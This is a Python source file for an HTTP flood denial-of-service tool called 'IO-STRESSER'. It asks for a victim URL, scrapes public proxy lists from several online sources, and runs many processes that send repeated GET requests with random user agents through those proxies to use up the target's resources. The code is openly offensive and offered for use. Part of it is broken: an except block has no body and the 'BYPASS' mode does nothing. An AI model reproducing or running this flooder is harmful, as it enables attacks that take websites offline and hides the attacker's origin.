from multiprocessing import Process
from lib.textColor import textGen
import fake_useragent
import requests
import random
import time

global R,B,C,G,Y,Q
R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; G='\033[1;32m'; Y='\033[1;33m'; Q='\033[1;36m'

banner = '''
 ______                    _                  
|_   _ \                  / |_                
  | |_) |   .--.    .--. `| |-'.---.  _ .--.  
  |  __'. / .'`\ \/ .'`\ \| | / /__\\[ `/'`\] 
 _| |__) || \__. || \__. || |,| \__., | |     
|_______/  '.__.'  '.__.' \__/ '.__.'[___]    
'''

logo = textGen(banner)

def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies):
    if len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {
            'Cache-Control': 'no-cache',
            'User-Agent': fake_useragent.UserAgent().random
        }
        try:
            response = proxiedRequest.get(target, headers=headers)
            print('[%s%s%s] HTTP_PROXY'%(Y,response.status_code,C))
            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            else:
                proxies = remove_by_value(proxies, proxy)
        except requests.RequestException as e:
            #print("Request Exception:", e)
            

def thread(target, proxies):
    while True:
        run(target, proxies)
        time.sleep(1)

def ioStresser():
    target = input('\33]0;Kusty🐀,  IO-STRESSER!🤬\a'+"%s\n%sWARNING%s: %sThis attack will use the power of your\n machine to consume the victim's resources.%s\n\n%sUrl%s: "%(logo,R,C,Y,C,B,C))
    times = int(input('%sTime%s: '%(B,C)))
    threads = int(input('%sThreads%s: '%(B,C)))
    attack_type = int(input('\n%sAttack Type%s\n\n[ %s1%s ] PROXY\n[ %s2%s ] BYPASS\n%s\nInput%s: '%(Q,C,G,C,G,C,B,C)))

    proxies = []

    if attack_type == 1:
        print("\n[%s-%s] ATTACK HTTP_PROXY\n"%(Y,C))
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    
    elif attack_type == 2:
        print("\n[%s-%s] ATTACK BYPASS"%(Y,C))
    
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies))
        processes.append(p)
        p.start()
        print(f"[{G}+{C}] IO-STRESSER THREAD: {_+1}")
    time.sleep(times)
    
    print('\n[%s!%s] Attack End'%(R,C))
    
    for p in processes:
        p.terminate()

